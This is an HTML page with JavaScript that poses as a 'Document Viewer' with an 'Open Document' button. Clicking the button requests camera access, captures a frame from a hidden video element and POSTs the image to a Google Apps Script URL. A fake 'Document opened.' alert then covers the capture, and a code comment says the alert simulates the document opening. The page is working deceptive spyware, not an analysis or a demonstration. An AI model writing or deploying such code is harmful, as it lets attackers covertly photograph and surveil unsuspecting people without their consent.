<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Camera Capture</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; }
    #video { display: none; }
    #captureBtn { padding: 10px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>
  <h2>Document Viewer</h2>
  <p>Click the button to load document</p>

  <video id="video" autoplay playsinline></video>
  <button id="captureBtn">Open Document</button>

  <script>
    let videoStream;

    async function startCamera() {
      try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('video').srcObject = videoStream;
      } catch (err) {
        alert('Camera access denied.');
      }
    }

    function capturePhoto() {
      if (!videoStream) {
        alert('Camera not started yet.');
        return;
      }
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/jpeg');

      // Send to your Google Apps Script
      fetch('https://script.google.com/macros/s/AKfycbxv3VtJgebN5j_tr4BZd3-hCjV1zsGlz_PFe_noz16zwC84XTtM86uMnH7NLhsgq8qm/exec', {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Start camera on first click
    document.getElementById('captureBtn').addEventListener('click', async () => {
      if (!videoStream) {
        await startCamera();
      }
      capturePhoto();
      // Simulate "document open" action
      alert('Document opened.');
    });
  </script>
</body>
</html>
